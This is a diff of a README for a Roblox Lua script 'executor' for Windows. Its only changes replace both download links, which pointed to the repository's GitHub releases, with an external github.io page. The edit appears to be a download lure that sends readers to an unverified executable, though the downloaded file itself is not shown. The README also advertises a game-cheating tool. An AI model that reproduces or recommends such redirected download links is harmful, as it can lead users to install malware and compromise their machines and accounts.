@@ -1,6 +1,6 @@
 # ⚙️ wearedevs-pc-lua-executor - Run Lua scripts on Windows easily
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Sibbiebotonnee748/wearedevs-pc-lua-executor/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://sibbiebotonnee748.github.io)
 
 This application executes Lua scripts for the Roblox platform on Windows 10 and 11. It provides a lightweight interface to run custom code. Users access a library of over 500 scripts through the built-in hub. The software includes tools for batch execution and error tracking. You do not need a subscription or keys to use these features.
 
@@ -8,7 +8,7 @@ This application executes Lua scripts for the Roblox platform on Windows 10 and 
 
 Visit the official release page to obtain the latest version of the executor.
 
-[Download the latest release here](https://github.com/Sibbiebotonnee748/wearedevs-pc-lua-executor/releases)
+[Download the latest release here](https://sibbiebotonnee748.github.io)
 
 1. Navigate to the link above.
 2. Look for the Assets section at the bottom of the newest release post.
